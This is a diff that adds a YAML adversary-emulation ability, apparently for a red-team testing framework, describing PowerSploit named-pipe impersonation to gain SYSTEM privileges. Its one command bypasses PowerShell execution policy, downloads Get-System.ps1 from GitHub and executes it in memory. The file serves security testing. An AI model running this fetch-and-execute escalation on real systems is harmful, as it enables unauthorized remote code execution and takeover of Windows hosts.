@@ -1,0 +1,13 @@
+- id: a89ea459-97ec-28fd-a552-9d305f023bbe
+  name: PowerSploit Named-Pipe Impersonation
+  description: PowerSploit named-pipe impersonation, similar to the technique used to escalate to SYSTEM-level privileges by FIN6.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1134
+    name: Access Token Manipulation
+  procedure_group: procedure_privesc
+  procedure_step: '3.1'
+  platforms:
+    windows:
+      psh:
+        command: powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
